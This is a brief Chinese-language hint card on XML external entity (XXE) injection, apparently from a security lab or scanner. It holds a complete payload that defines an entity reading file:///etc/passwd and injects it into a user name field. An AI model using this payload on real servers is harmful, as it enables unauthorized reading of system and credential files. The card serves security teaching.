🚨 XXE 漏洞提示

  • 漏洞类型：XML 外部实体注入 (XXE)
  • 利用方式：在 XML 中定义外部实体引用本地文件
  • Payload 示例：
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <user>
    <name>&xxe;</name>
    <email>test@example.com</email>
  </user>
</root>
  • 危害：可读取服务器任意文件，泄露敏感信息
